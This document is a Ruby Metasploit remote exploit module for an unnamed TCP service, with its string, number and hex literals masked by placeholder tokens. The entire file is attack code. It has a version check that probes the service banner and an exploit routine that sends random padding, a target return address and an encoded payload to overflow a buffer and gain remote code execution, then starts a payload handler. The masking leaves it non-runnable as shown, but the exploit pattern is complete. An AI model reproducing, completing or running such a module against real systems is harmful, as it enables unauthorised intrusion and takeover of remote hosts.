require <str> class Metasploit3 < Msf :: Exploit :: Remote Rank = AverageRanking include Msf :: Exploit :: Remote :: Tcp def initialize ( info = { } ) super ( update_info ( info , <str> = > <str> , <str> = > <str> , <str> = > [ <str> ] , <str> = > MSF_LICENSE , <str> = > [ [ <str> , <str> ] , [ <str> , <str> ] , [ <str> , <str> ] , ] , <str> = > true , <str> = > { <str> = > <str> , } , <str> = > { <str> = > <int> , <str> = > <str> , <str> = > - <int> , <str> = > <str> , } , <str> = > <str> , <str> = > [ [ <str> , { <str> = > <hex> } ] , [ <str> , { <str> = > <hex> } ] , ] , <str> = > <str> , <str> = > <int> ) ) register_options ( [ Opt :: RPORT ( <int> ) ] , self . class ) end def check connect sock . put ( <str> ) ver = sock . get_once disconnect if ( ver and ver =~ <str> ) return Exploit :: CheckCode :: Appears end return Exploit :: CheckCode :: Safe end def exploit connect buffer = rand_text_alpha_upper ( <int> ) + [ target . ret ] . pack ( <str> ) buffer << payload . encoded + rand_text_alpha_upper ( <int> ) sploit = <str> sploit << <str> sploit << <str> sploit << buffer print_status ( <str> target . name <str> ) sock . put ( sploit ) handler disconnect end end 
